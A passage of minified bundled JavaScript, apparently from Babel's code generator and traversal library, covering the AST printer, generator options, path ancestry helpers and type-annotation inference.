PW=RW();Object.keys(PW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===PW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return PW[X]}})});var SW=IM();Object.keys(SW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===SW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return SW[X]}})});var TW=PM();Object.keys(TW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===TW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return TW[X]}})});var _W=TM();Object.keys(_W).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===_W[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return _W[X]}})});var EW=fM();Object.keys(EW).forEach(function(X){if(X==="default"||X==="__esModule")return;if(X in s1&&s1[X]===EW[X])return;Object.defineProperty(s1,X,{enumerable:!0,get:function(){return EW[X]}})})});var yM=v((hM)=>{Object.defineProperty(hM,"__esModule",{value:!0});hM.addDeprecatedGenerators=TL1;function TL1(X){{let J={Noop(){},TSExpressionWithTypeArguments(Q){this.print(Q.expression),this.print(Q.typeParameters)},DecimalLiteral(Q){let Y=this.getPossibleRaw(Q);if(!this.format.minified&&Y!==void 0){this.word(Y);return}this.word(Q.value+"m")}};Object.assign(X.prototype,J)}}});var pM=v((cM)=>{Object.defineProperty(cM,"__esModule",{value:!0});cM.default=void 0;var EL1=IB(),p0=lX(),mM=p0,kL1=y1(),bL1=sB(),vL1=xM(),fL1=yM(),{isExpression:xL1,isFunction:hL1,isStatement:yL1,isClassBody:gL1,isTSInterfaceBody:mL1,isTSEnumMember:uL1}=kL1,cL1=/e/i,lL1=/\.0+$/,uM=/[\n\r\u2028\u2029]/,pL1=/[\n\r\u2028\u2029]|\*\//;function gM(X){return X.type==="CommentLine"||uM.test(X.value)}var{needsParens:dL1}=mM;class D4{constructor(X,J,Q,Y){this.tokenContext=p0.TokenContext.normal,this._tokens=null,this._originalCode=null,this._currentNode=null,this._indent=0,this._indentRepeat=0,this._insideAux=!1,this._noLineTerminator=!1,this._noLineTerminatorAfterNode=null,this._printAuxAfterOnNextUserNode=!1,this._printedComments=new Set,this._endsWithInteger=!1,this._endsWithWord=!1,this._endsWithDiv=!1,this._lastCommentLine=0,this._endsWithInnerRaw=!1,this._indentInnerComments=!0,this.tokenMap=null,this._boundGetRawIdentifier=this._getRawIdentifier.bind(this),this._printSemicolonBeforeNextNode=-1,this._printSemicolonBeforeNextToken=-1,this.format=X,this._tokens=Q,this._originalCode=Y,this._indentRepeat=X.indent.style.length,this._inputMap=J==null?void 0:J._inputMap,this._buf=new EL1.default(J,X.indent.style[0])}enterForStatementInit(){return this.tokenContext|=p0.TokenContext.forInitHead|p0.TokenContext.forInOrInitHeadAccumulate,()=>this.tokenContext=p0.TokenContext.normal}enterForXStatementInit(X){if(X)return this.tokenContext|=p0.TokenContext.forOfHead,null;else return this.tokenContext|=p0.TokenContext.forInHead|p0.TokenContext.forInOrInitHeadAccumulate,()=>this.tokenContext=p0.TokenContext.normal}enterDelimited(){let X=this.tokenContext,J=this._noLineTerminatorAfterNode;if(!(X&p0.TokenContext.forInOrInitHeadAccumulate)&&J===null)return()=>{};return this._noLineTerminatorAfterNode=null,this.tokenContext=p0.TokenContext.normal,()=>{this._noLineTerminatorAfterNode=J,this.tokenContext=X}}generate(X){if(this.format.preserveFormat)this.tokenMap=new bL1.TokenMap(X,this._tokens,this._originalCode);return this.print(X),this._maybeAddAuxComment(),this._buf.get()}indent(){let{format:X}=this;if(X.preserveFormat||X.compact||X.concise)return;this._indent++}dedent(){let{format:X}=this;if(X.preserveFormat||X.compact||X.concise)return;this._indent--}semicolon(X=!1){if(this._maybeAddAuxComment(),X){this._appendChar(59),this._noLineTerminator=!1;return}if(this.tokenMap){let J=this._currentNode;if(J.start!=null&&J.end!=null){if(!this.tokenMap.endMatches(J,";")){this._printSemicolonBeforeNextNode=this._buf.getCurrentLine();return}let Q=this.tokenMap.getIndexes(this._currentNode);this._catchUpTo(this._tokens[Q[Q.length-1]].loc.start)}}this._queue(59),this._noLineTerminator=!1}rightBrace(X){if(this.format.minified)this._buf.removeLastSemicolon();this.sourceWithOffset("end",X.loc,-1),this.tokenChar(125)}rightParens(X){this.sourceWithOffset("end",X.loc,-1),this.tokenChar(41)}space(X=!1){let{format:J}=this;if(J.compact||J.preserveFormat)return;if(X)this._space();else if(this._buf.hasContent()){let Q=this.getLastChar();if(Q!==32&&Q!==10)this._space()}}word(X,J=!1){if(this.tokenContext&=p0.TokenContext.forInOrInitHeadAccumulatePassThroughMask,this._maybePrintInnerComments(X),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(X);if(this._endsWithWord||this._endsWithDiv&&X.charCodeAt(0)===47)this._space();this._append(X,!1),this._endsWithWord=!0,this._noLineTerminator=J}number(X,J){function Q(Y){if(Y.length>2&&Y.charCodeAt(0)===48){let W=Y.charCodeAt(1);return W===98||W===111||W===120}return!1}this.word(X),this._endsWithInteger=Number.isInteger(J)&&!Q(X)&&!cL1.test(X)&&!lL1.test(X)&&X.charCodeAt(X.length-1)!==46}token(X,J=!1,Q=0){if(this.tokenContext&=p0.TokenContext.forInOrInitHeadAccumulatePassThroughMask,this._maybePrintInnerComments(X,Q),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(X,Q);let Y=this.getLastChar(),W=X.charCodeAt(0);if(Y===33&&(X==="--"||W===61)||W===43&&Y===43||W===45&&Y===45||W===46&&this._endsWithInteger)this._space();this._append(X,J),this._noLineTerminator=!1}tokenChar(X){this.tokenContext&=p0.TokenContext.forInOrInitHeadAccumulatePassThroughMask;let J=String.fromCharCode(X);if(this._maybePrintInnerComments(J),this._maybeAddAuxComment(),this.tokenMap)this._catchUpToCurrentToken(J);let Q=this.getLastChar();if(X===43&&Q===43||X===45&&Q===45||X===46&&this._endsWithInteger)this._space();this._appendChar(X),this._noLineTerminator=!1}newline(X=1,J){if(X<=0)return;if(!J){if(this.format.retainLines||this.format.compact)return;if(this.format.concise){this.space();return}}if(X>2)X=2;X-=this._buf.getNewlineCount();for(let Q=0;Q<X;Q++)this._newline();return}endsWith(X){return this.getLastChar()===X}getLastChar(){return this._buf.getLastChar()}endsWithCharAndNewline(){return this._buf.endsWithCharAndNewline()}removeTrailingNewline(){this._buf.removeTrailingNewline()}exactSource(X,J){if(!X){J();return}this._catchUp("start",X),this._buf.exactSource(X,J)}source(X,J){if(!J)return;this._catchUp(X,J),this._buf.source(X,J)}sourceWithOffset(X,J,Q){if(!J||this.format.preserveFormat)return;this._catchUp(X,J),this._buf.sourceWithOffset(X,J,Q)}sourceIdentifierName(X,J){if(!this._buf._canMarkIdName)return;let Q=this._buf._sourcePosition;Q.identifierNamePos=J,Q.identifierName=X}_space(){this._queue(32)}_newline(){this._queue(10)}_catchUpToCurrentToken(X,J=0){let Q=this.tokenMap.findMatching(this._currentNode,X,J);if(Q)this._catchUpTo(Q.loc.start);if(this._printSemicolonBeforeNextToken!==-1&&this._printSemicolonBeforeNextToken===this._buf.getCurrentLine())this._buf.appendChar(59),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1;this._printSemicolonBeforeNextToken=-1,this._printSemicolonBeforeNextNode=-1}_append(X,J){this._maybeIndent(X.charCodeAt(0)),this._buf.append(X,J),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1}_appendChar(X){this._maybeIndent(X),this._buf.appendChar(X),this._endsWithWord=!1,this._endsWithInteger=!1,this._endsWithDiv=!1}_queue(X){this._maybeIndent(X),this._buf.queue(X),this._endsWithWord=!1,this._endsWithInteger=!1}_maybeIndent(X){if(this._indent&&X!==10&&this.endsWith(10))this._buf.queueIndentation(this._getIndent())}_shouldIndent(X){if(this._indent&&X!==10&&this.endsWith(10))return!0}catchUp(X){if(!this.format.retainLines)return;let J=X-this._buf.getCurrentLine();for(let Q=0;Q<J;Q++)this._newline()}_catchUp(X,J){let{format:Q}=this;if(!Q.preserveFormat){if(Q.retainLines&&J!=null&&J[X])this.catchUp(J[X].line);return}let Y=J==null?void 0:J[X];if(Y!=null)this._catchUpTo(Y)}_catchUpTo({line:X,column:J,index:Q}){let Y=X-this._buf.getCurrentLine();if(Y>0&&this._noLineTerminator)return;for(let G=0;G<Y;G++)this._newline();let W=Y>0?J:J-this._buf.getCurrentColumn();if(W>0){let G=this._originalCode?this._originalCode.slice(Q-W,Q).replace(/[^\t\x0B\f \xA0\u1680\u2000-\u200A\u202F\u205F\u3000\uFEFF]/gu," "):" ".repeat(W);this._append(G,!1)}}_getIndent(){return this._indentRepeat*this._indent}printTerminatorless(X){this._noLineTerminator=!0,this.print(X)}print(X,J,Q){var Y,W,G;if(!X)return;this._endsWithInnerRaw=!1;let H=X.type,z=this.format,$=z.concise;if(X._compact)z.concise=!0;let V=this[H];if(V===void 0)throw ReferenceError(`unknown node of type ${JSON.stringify(H)} with constructor ${JSON.stringify(X.constructor.name)}`);let K=this._currentNode;if(this._currentNode=X,this.tokenMap)this._printSemicolonBeforeNextToken=this._printSemicolonBeforeNextNode;let Z=this._insideAux;this._insideAux=X.loc==null,this._maybeAddAuxComment(this._insideAux&&!Z);let q=(Y=X.extra)==null?void 0:Y.parenthesized,B=q&&z.preserveFormat||q&&z.retainFunctionParens&&H==="FunctionExpression"||dL1(X,K,this.tokenContext,z.preserveFormat?this._boundGetRawIdentifier:void 0);if(!B&&q&&(W=X.leadingComments)!=null&&W.length&&X.leadingComments[0].type==="CommentBlock")switch(K==null?void 0:K.type){case"ExpressionStatement":case"VariableDeclarator":case"AssignmentExpression":case"ReturnStatement":break;case"CallExpression":case"OptionalCallExpression":case"NewExpression":if(K.callee!==X)break;default:B=!0}let M=!1;if(!B&&this._noLineTerminator&&((G=X.leadingComments)!=null&&G.some(gM)||this.format.retainLines&&X.loc&&X.loc.start.line>this._buf.getCurrentLine()))B=!0,M=!0;let O,R;if(!B){if(J||(J=K&&this._noLineTerminatorAfterNode===K&&mM.isLastChild(K,X)),J){var I;if((I=X.trailingComments)!=null&&I.some(gM)){if(xL1(X))B=!0}else O=this._noLineTerminatorAfterNode,this._noLineTerminatorAfterNode=X}}if(B){if(this.tokenChar(40),M)this.indent();if(this._endsWithInnerRaw=!1,this.tokenContext&p0.TokenContext.forInOrInitHeadAccumulate)R=this.tokenContext,this.tokenContext=p0.TokenContext.normal;O=this._noLineTerminatorAfterNode,this._noLineTerminatorAfterNode=null}this._lastCommentLine=0,this._printLeadingComments(X,K);let F=H==="Program"||H==="File"?null:X.loc;if(this.exactSource(F,V.bind(this,X,K)),B){if(this._printTrailingComments(X,K),M)this.dedent(),this.newline();if(this.tokenChar(41),this._noLineTerminator=J,R)this.tokenContext=R}else if(J&&!this._noLineTerminator)this._noLineTerminator=!0,this._printTrailingComments(X,K);else this._printTrailingComments(X,K,Q);if(this._currentNode=K,z.concise=$,this._insideAux=Z,O!==void 0)this._noLineTerminatorAfterNode=O;this._endsWithInnerRaw=!1}_maybeAddAuxComment(X){if(X)this._printAuxBeforeComment();if(!this._insideAux)this._printAuxAfterComment()}_printAuxBeforeComment(){if(this._printAuxAfterOnNextUserNode)return;this._printAuxAfterOnNextUserNode=!0;let X=this.format.auxiliaryCommentBefore;if(X)this._printComment({type:"CommentBlock",value:X},0)}_printAuxAfterComment(){if(!this._printAuxAfterOnNextUserNode)return;this._printAuxAfterOnNextUserNode=!1;let X=this.format.auxiliaryCommentAfter;if(X)this._printComment({type:"CommentBlock",value:X},0)}getPossibleRaw(X){let J=X.extra;if((J==null?void 0:J.raw)!=null&&J.rawValue!=null&&X.value===J.rawValue)return J.raw}printJoin(X,J,Q,Y,W,G,H,z){if(!(X!=null&&X.length))return;if(Q==null&&this.format.retainLines){var $;let M=($=X[0].loc)==null?void 0:$.start.line;if(M!=null&&M!==this._buf.getCurrentLine())Q=!0}if(Q)this.indent();let V={addNewlines:G,nextNodeStartLine:0},K=Y==null?void 0:Y.bind(this),Z=X.length;for(let M=0;M<Z;M++){let O=X[M];if(!O)continue;if(J)this._printNewline(M===0,V);if(this.print(O,void 0,z||0),H==null||H(O,M),K!=null){if(M<Z-1)K(M,!1);else if(W)K(M,!0)}if(J){var q;if(!((q=O.trailingComments)!=null&&q.length))this._lastCommentLine=0;if(M+1===Z)this.newline(1);else{var B;let R=X[M+1];V.nextNodeStartLine=((B=R.loc)==null?void 0:B.start.line)||0,this._printNewline(!0,V)}}}if(Q)this.dedent()}printAndIndentOnComments(X){let J=X.leadingComments&&X.leadingComments.length>0;if(J)this.indent();if(this.print(X),J)this.dedent()}printBlock(X){let J=X.body;if(J.type!=="EmptyStatement")this.space();this.print(J)}_printTrailingComments(X,J,Q){let{innerComments:Y,trailingComments:W}=X;if(Y!=null&&Y.length)this._printComments(2,Y,X,J,Q);if(W!=null&&W.length)this._printComments(2,W,X,J,Q)}_printLeadingComments(X,J){let Q=X.leadingComments;if(!(Q!=null&&Q.length))return;this._printComments(0,Q,X,J)}_maybePrintInnerComments(X,J){if(this._endsWithInnerRaw){var Q;this.printInnerComments((Q=this.tokenMap)==null?void 0:Q.findMatching(this._currentNode,X,J))}this._endsWithInnerRaw=!0,this._indentInnerComments=!0}printInnerComments(X){let J=this._currentNode,Q=J.innerComments;if(!(Q!=null&&Q.length))return;let Y=this.endsWith(32),W=this._indentInnerComments,G=this._printedComments.size;if(W)this.indent();if(this._printComments(1,Q,J,void 0,void 0,X),Y&&G!==this._printedComments.size)this.space();if(W)this.dedent()}noIndentInnerCommentsHere(){this._indentInnerComments=!1}printSequence(X,J,Q,Y){this.printJoin(X,!0,J!=null?J:!1,void 0,void 0,Y,void 0,Q)}printList(X,J,Q,Y,W,G){this.printJoin(X,Q,Y,W!=null?W:iL1,J,void 0,G)}shouldPrintTrailingComma(X){if(!this.tokenMap)return null;let J=this.tokenMap.findLastIndex(this._currentNode,(Q)=>this.tokenMap.matchesOriginal(Q,X));if(J<=0)return null;return this.tokenMap.matchesOriginal(this._tokens[J-1],",")}_printNewline(X,J){let Q=this.format;if(Q.retainLines||Q.compact)return;if(Q.concise){this.space();return}if(!X)return;let Y=J.nextNodeStartLine,W=this._lastCommentLine;if(Y>0&&W>0){let G=Y-W;if(G>=0){this.newline(G||1);return}}if(this._buf.hasContent())this.newline(1)}_shouldPrintComment(X,J){if(X.ignore)return 0;if(this._printedComments.has(X))return 0;if(this._noLineTerminator&&pL1.test(X.value))return 2;if(J&&this.tokenMap){let Q=this.tokenMap.find(this._currentNode,(Y)=>Y.value===X.value);if(Q&&Q.start>J.start)return 2}if(this._printedComments.add(X),!this.format.shouldPrintComment(X.value))return 0;return 1}_printComment(X,J){let Q=this._noLineTerminator,Y=X.type==="CommentBlock",W=Y&&J!==1&&!this._noLineTerminator;if(W&&this._buf.hasContent()&&J!==2)this.newline(1);let G=this.getLastChar();if(G!==91&&G!==123&&G!==40)this.space();let H;if(Y){if(H=`/*${X.value}*/`,this.format.indent.adjustMultilineComment){var z;let $=(z=X.loc)==null?void 0:z.start.column;if($){let V=new RegExp("\\n\\s{1,"+$+"}","g");H=H.replace(V,`
`)}if(this.format.concise)H=H.replace(/\n(?!$)/g,`
`);else{let V=this.format.retainLines?0:this._buf.getCurrentColumn();if(this._shouldIndent(47)||this.format.retainLines)V+=this._getIndent();H=H.replace(/\n(?!$)/g,`
${" ".repeat(V)}`)}}}else if(!Q)H=`//${X.value}`;else H=`/*${X.value}*/`;if(this._endsWithDiv)this._space();if(this.tokenMap){let{_printSemicolonBeforeNextToken:$,_printSemicolonBeforeNextNode:V}=this;this._printSemicolonBeforeNextToken=-1,this._printSemicolonBeforeNextNode=-1,this.source("start",X.loc),this._append(H,Y),this._printSemicolonBeforeNextNode=V,this._printSemicolonBeforeNextToken=$}else this.source("start",X.loc),this._append(H,Y);if(!Y&&!Q)this.newline(1,!0);if(W&&J!==3)this.newline(1)}_printComments(X,J,Q,Y,W=0,G){let H=Q.loc,z=J.length,$=!!H,V=$?H.start.line:0,K=$?H.end.line:0,Z=0,q=0,B=this._noLineTerminator?function(){}:this.newline.bind(this);for(let M=0;M<z;M++){let O=J[M],R=this._shouldPrintComment(O,G);if(R===2){$=!1;break}if($&&O.loc&&R===1){let I=O.loc.start.line,F=O.loc.end.line;if(X===0){let T=0;if(M===0){if(this._buf.hasContent()&&(O.type==="CommentLine"||I!==F))T=q=1}else T=I-Z;if(Z=F,B(T),this._printComment(O,1),M+1===z)B(Math.max(V-Z,q)),Z=V}else if(X===1){let T=I-(M===0?V:Z);if(Z=F,B(T),this._printComment(O,1),M+1===z)B(Math.min(1,K-Z)),Z=K}else{let T=I-(M===0?K-W:Z);Z=F,B(T),this._printComment(O,1)}}else{if($=!1,R!==1)continue;if(z===1){let I=O.loc?O.loc.start.line===O.loc.end.line:!uM.test(O.value),F=I&&!yL1(Q)&&!gL1(Y)&&!mL1(Y)&&!uL1(Q);if(X===0)this._printComment(O,F&&Q.type!=="ObjectExpression"||I&&hL1(Y,{body:Q})?1:0);else if(F&&X===2)this._printComment(O,1);else this._printComment(O,0)}else if(X===1&&!(Q.type==="ObjectExpression"&&Q.properties.length>1)&&Q.type!=="ClassBody"&&Q.type!=="TSInterfaceBody")this._printComment(O,M===0?2:M===z-1?3:0);else this._printComment(O,0)}}if(X===2&&$&&Z)this._lastCommentLine=Z}}Object.assign(D4.prototype,vL1);(0,fL1.addDeprecatedGenerators)(D4);var _s1=cM.default=D4;function iL1(X,J){if(this.token(",",!1,X),!J)this.space()}});var oM=v((nM)=>{Object.defineProperty(nM,"__esModule",{value:!0});nM.default=void 0;nM.generate=aM;var dM=DB(),iM=pM();function rM(X,J,Q){if(J.experimental_preserveFormat){if(typeof X!=="string")throw Error("`experimental_preserveFormat` requires the original `code` to be passed to @babel/generator as a string");if(!J.retainLines)throw Error("`experimental_preserveFormat` requires `retainLines` to be set to `true`");if(J.compact&&J.compact!=="auto")throw Error("`experimental_preserveFormat` is not compatible with the `compact` option");if(J.minified)throw Error("`experimental_preserveFormat` is not compatible with the `minified` option");if(J.jsescOption)throw Error("`experimental_preserveFormat` is not compatible with the `jsescOption` option");if(!Array.isArray(Q.tokens))throw Error("`experimental_preserveFormat` requires the AST to have attached the token of the input code. Make sure to enable the `tokens: true` parser option.")}let Y={auxiliaryCommentBefore:J.auxiliaryCommentBefore,auxiliaryCommentAfter:J.auxiliaryCommentAfter,shouldPrintComment:J.shouldPrintComment,preserveFormat:J.experimental_preserveFormat,retainLines:J.retainLines,retainFunctionParens:J.retainFunctionParens,comments:J.comments==null||J.comments,compact:J.compact,minified:J.minified,concise:J.concise,indent:{adjustMultilineComment:!0,style:"  "},jsescOption:Object.assign({quotes:"double",wrap:!0,minimal:!1},J.jsescOption),topicToken:J.topicToken,importAttributesKeyword:J.importAttributesKeyword};{var W;Y.decoratorsBeforeExport=J.decoratorsBeforeExport,Y.jsescOption.json=J.jsonCompatibleStrings,Y.recordAndTupleSyntaxType=(W=J.recordAndTupleSyntaxType)!=null?W:"hash"}if(Y.minified)Y.compact=!0,Y.shouldPrintComment=Y.shouldPrintComment||(()=>Y.comments);else Y.shouldPrintComment=Y.shouldPrintComment||(($)=>Y.comments||$.includes("@license")||$.includes("@preserve"));if(Y.compact==="auto"){if(Y.compact=typeof X==="string"&&X.length>500000,Y.compact)console.error(`[BABEL] Note: The code generator has deoptimised the styling of ${J.filename} as it exceeds the max of 500KB.`)}if(Y.compact||Y.preserveFormat)Y.indent.adjustMultilineComment=!1;let{auxiliaryCommentBefore:G,auxiliaryCommentAfter:H,shouldPrintComment:z}=Y;if(G&&!z(G))Y.auxiliaryCommentBefore=void 0;if(H&&!z(H))Y.auxiliaryCommentAfter=void 0;return Y}nM.CodeGenerator=class{constructor(J,Q={},Y){this._ast=void 0,this._format=void 0,this._map=void 0,this._ast=J,this._format=rM(Y,Q,J),this._map=Q.sourceMaps?new dM.default(Q,Y):null}generate(){return new iM.default(this._format,this._map).generate(this._ast)}};function aM(X,J={},Q){let Y=rM(Q,J,X),W=J.sourceMaps?new dM.default(J,Q):null;return new iM.default(Y,W,X.tokens,typeof Q==="string"?Q:null).generate(X)}var ks1=nM.default=aM});var eM=v((tM)=>{Object.defineProperty(tM,"__esModule",{value:!0});tM.find=oL1;tM.findParent=sL1;tM.getAncestry=QI1;tM.getDeepestCommonAncestorFrom=JI1;tM.getEarliestCommonAncestorFrom=XI1;tM.getFunctionParent=tL1;tM.getStatementParent=eL1;tM.inType=GI1;tM.isAncestor=YI1;tM.isDescendant=WI1;var aL1=y1(),{VISITOR_KEYS:nL1}=aL1;function sL1(X){let J=this;while(J=J.parentPath)if(X(J))return J;return null}function oL1(X){let J=this;do if(X(J))return J;while(J=J.parentPath);return null}function tL1(){return this.findParent((X)=>X.isFunction())}function eL1(){let X=this;do if(!X.parentPath||Array.isArray(X.container)&&X.isStatement())break;else X=X.parentPath;while(X);if(X&&(X.isProgram()||X.isFile()))throw Error("File/Program node, we can't possibly find a statement parent to this");return X}function XI1(X){return this.getDeepestCommonAncestorFrom(X,function(J,Q,Y){let W,G=nL1[J.type];for(let H of Y){let z=H[Q+1];if(!W){W=z;continue}if(z.listKey&&W.listKey===z.listKey){if(z.key<W.key){W=z;continue}}let $=G.indexOf(W.parentKey),V=G.indexOf(z.parentKey);if($>V)W=z}return W})}function JI1(X,J){if(!X.length)return this;if(X.length===1)return X[0];let Q=1/0,Y,W,G=X.map((z)=>{let $=[];do $.unshift(z);while((z=z.parentPath)&&z!==this);if($.length<Q)Q=$.length;return $}),H=G[0];X:for(let z=0;z<Q;z++){let $=H[z];for(let V of G)if(V[z]!==$)break X;Y=z,W=$}if(W)if(J)return J(W,Y,G);else return W;else throw Error("Couldn't find intersection")}function QI1(){let X=this,J=[];do J.push(X);while(X=X.parentPath);return J}function YI1(X){return X.isDescendant(this)}function WI1(X){return!!this.findParent((J)=>J===X)}function GI1(...X){let J=this;while(J){if(X.includes(J.node.type))return!0;J=J.parentPath}return!1}});var kW=v((Qj)=>{Object.defineProperty(Qj,"__esModule",{value:!0});Qj.createUnionType=AI1;var jI1=y1(),{createFlowUnionType:Xj,createTSUnionType:Jj,createUnionTypeAnnotation:OI1,isFlowType:FI1,isTSType:RI1}=jI1;function AI1(X){if(X.every((J)=>FI1(J))){if(Xj)return Xj(X);return OI1(X)}else if(X.every((J)=>RI1(J))){if(Jj)return Jj(X)}}});var $j=v((zj)=>{Object.defineProperty(zj,"__esModule",{value:!0});zj.default=CI1;var wI1=y1(),Wj=kW(),{BOOLEAN_NUMBER_BINARY_OPERATORS:NI1,createTypeAnnotationBasedOnTypeof:LI1,numberTypeAnnotation:Gj,voidTypeAnnotation:II1}=wI1;function CI1(X){if(!this.isReferenced())return;let J=this.scope.getBinding(X.name);if(J)if(J.identifier.typeAnnotation)return J.identifier.typeAnnotation;else return PI1(J,this,X.name);if(X.name==="undefined")return II1();else if(X.name==="NaN"||X.name==="Infinity")return Gj();else if(X.name==="arguments");}function PI1(X,J,Q){let Y=[],W=[],G=Yj(X,J,W),H=Hj(X,J,Q);if(H){let z=Yj(X,H.ifStatement);G=G.filter(($)=>!z.includes($)),Y.push(H.typeAnnotation)}if(G.length){G.push(...W);for(let z of G)Y.push(z.getTypeAnnotation())}if(!Y.length)return;return(0,Wj.createUnionType)(Y)}function Yj(X,J,Q){let Y=X.constantViolations.slice();return Y.unshift(X.path),Y.filter((W)=>{W=W.resolve();let G=W._guessExecutionStatusRelativeTo(J);if(Q&&G==="unknown")Q.push(W);return G==="before"})}function SI1(X,J){let Q=J.node.operator,Y=J.get("right").resolve(),W=J.get("left").resolve(),G;if(W.isIdentifier({name:X}))G=Y;else if(Y.isIdentifier({name:X}))G=W;if(G){if(Q==="===")return G.getTypeAnnotation();if(NI1.includes(Q))return Gj();return}if(Q!=="==="&&Q!=="==")return;let H,z;if(W.isUnaryExpression({operator:"typeof"}))H=W,z=Y;else if(Y.isUnaryExpression({operator:"typeof"}))H=Y,z=W;if(!H)return;if(!H.get("argument").isIdentifier({name:X}))return;if(z=z.resolve(),!z.isLiteral())return;let $=z.node.value;if(typeof $!=="string")return;return LI1($)}function TI1(X,J,Q){let Y;while(Y=J.parentPath){if(Y.isIfStatement()||Y.isConditionalExpression()){if(J.key==="test")return;return Y}if(Y.isFunction()){if(Y.parentPath.scope.getBinding(Q)!==X)return}J=Y}}function Hj(X,J,Q){let Y=TI1(X,J,Q);if(!Y)return;let G=[Y.get("test")],H=[];for(let z=0;z<G.length;z++){let $=G[z];if($.isLogicalExpression()){if($.node.operator==="&&")G.push($.get("left")),G.push($.get("right"))}else if($.isBinaryExpression()){let V=SI1(Q,$);if(V)H.push(V)}}if(H.length)return{typeAnnotation:(0,Wj.createUnionType)(H),ifStatement:Y};return Hj(X,Y,Q)}});var jj=v((fW)=>{Object.defineProperty(fW,"__esModule",{value:!0});fW.ArrayExpression=qj;fW.AssignmentExpression=eI1;fW.BinaryExpression=aI1;fW.BooleanLiteral=YC1;fW.CallExpression=ZC1;fW.ConditionalExpression=sI1;fW.ClassDeclaration=fW.ClassExpression=fW.FunctionDeclaration=fW.ArrowFunctionExpression=fW.FunctionExpression=zC1;Object.defineProperty(fW,"Identifier",{enumerable:!0,get:function(){return kI1.default}});fW.LogicalExpression=nI1;fW.NewExpression=dI1;fW.NullLiteral=WC1;fW.NumericLiteral=QC1;fW.ObjectExpression=HC1;fW.ParenthesizedExpression=tI1;fW.RegExpLiteral=GC1;fW.RestElement=Bj;fW.SequenceExpression=oI1;fW.StringLiteral=JC1;fW.TSAsExpression=Zj;fW.TSNonNullExpression=pI1;fW.TaggedTemplateExpression=qC1;fW.TemplateLiteral=iI1;fW.TypeCastExpression=Uj;fW.UnaryExpression=rI1;fW.UpdateExpression=XC1;fW.VariableDeclarator=lI1;var EI1=y1(),kI1=$j(),Kj=kW(),{BOOLEAN_BINARY_OPERATORS:bI1,BOOLEAN_UNARY_OPERATORS:vI1,NUMBER_BINARY_OPERATORS:fI1,NUMBER_UNARY_OPERATORS:xI1,STRING_UNARY_OPERATORS:hI1,anyTypeAnnotation:Vj,arrayTypeAnnotation:bW,booleanTypeAnnotation:vW,buildMatchMemberExpression:w4,genericTypeAnnotation:UX,identifier:pX,nullLiteralTypeAnnotation:yI1,numberTypeAnnotation:n8,stringTypeAnnotation:dX,tupleTypeAnnotation:gI1,unionTypeAnnotation:mI1,voidTypeAnnotation:uI1,isIdentifier:cI1}=EI1;function lI1(){if(!this.get("id").isIdentifier())return;return this.get("init").getTypeAnnotation()}function Uj(X){return X.typeAnnotation}Uj.validParent=!0;function Zj(X){return X.typeAnnotation}Zj.validParent=!0;function pI1(){return this.get("expression").getTypeAnnotation()}function dI1(X){if(X.callee.type==="Identifier")return UX(X.callee)}function iI1(){return dX()}function rI1(X){let J=X.operator;if(J==="void")return uI1();else if(xI1.includes(J))return n8();else if(hI1.includes(J))return dX();else if(vI1.includes(J))return vW()}function aI1(X){let J=X.operator;if(fI1.includes(J))return n8();else if(bI1.includes(J))return vW();else if(J==="+"){let Q=this.get("right"),Y=this.get("left");if(Y.isBaseType("number")&&Q.isBaseType("number"))return n8();else if(Y.isBaseType("string")||Q.isBaseType("string"))return dX();return mI1([dX(),n8()])}}function nI1(){let X=[this.get("left").getTypeAnnotation(),this.get("right").getTypeAnnotation()];return(0,Kj.createUnionType)(X)}function sI1(){let X=[this.get("consequent").getTypeAnnotation(),this.get("alternate").getTypeAnnotation()];return(0,Kj.createUnionType)(X)}function oI1(){return this.get("expressions").pop().getTypeAnnotation()}function tI1(){return this.get("expression").getTypeAnnotation()}function eI1(){return this.get("right").getTypeAnnotation()}function XC1(X){let J=X.operator;if(J==="++"||J==="--")return n8()}function JC1(){return dX()}function QC1(){return n8()}function YC1(){return vW()}function WC1(){return yI1()}function GC1(){return UX(pX("RegExp"))}function HC1(){return UX(pX("Object"))}function qj(){return UX(pX("Array"))}function Bj(){return qj()}Bj.validParent=!0;function zC1(){return UX(pX("Function"))}var $C1=w4("Array.from"),VC1=w4("Object.keys"),KC1=w4("Object.values"),UC1=w4("Object.entries");function ZC1(){let{callee:X}=this.node;if(VC1(X))return bW(dX());else if($C1(X)||KC1(X)||cI1(X,{name:"Array"}))return bW(Vj());else if(UC1(X))return bW(gI1([dX(),Vj()]));return Mj(this.get("callee"))}function qC1(){return Mj(this.get("tag"))}function Mj(X){if(X=X.resolve(),X.isFunction()){let{node:J}=X;if(J.async)if(J.generator)return UX(pX("AsyncIterator"));else return UX(pX("Promise"));else if(J.generator)return UX(pX("Iterator"));else if(X.node.returnType)return X.node.returnType}}});var wj=v((Dj)=>{Object.defineProperty(Dj,"__esModule",{value:!0});Dj._getTypeAnnotation=Aj;Dj.baseTypeStrictlyMatches=HP1;Dj.couldBeBaseType=GP1;Dj.getTypeAnnotation=YP1;Dj.isBaseType=WP1;Dj.isGenericType=zP1;var Oj=jj(),gC1=y1(),{anyTypeAnnotation:Rj,isAnyTypeAnnotation:N4,isArrayTypeAnnotation:mC1,isBooleanTypeAnnotation:uC1,isEmptyTypeAnnotation:cC1,isFlowBaseAnnotation:lC1,isGenericTypeAnnotation:pC1,isIdentifier:Fj,isMixedTypeAnnotation:dC1,isNumberTypeAnnotation:iC1,isStringTypeAnnotation:rC1,isTSArrayType:aC1,isTSTypeAnnotation:nC1,isTSTypeReference:sC1,isTupleTypeAnnotation:oC1,isTypeAnnotation:tC1,isUnionTypeAnnotation:eC1,isVoidTypeAnnotation:XP1,stringTypeAnnotation:JP1,voidTypeAnnotation:QP1}=gC1;function YP1(){let X=this.getData("typeAnnotation");if(X!=null)return 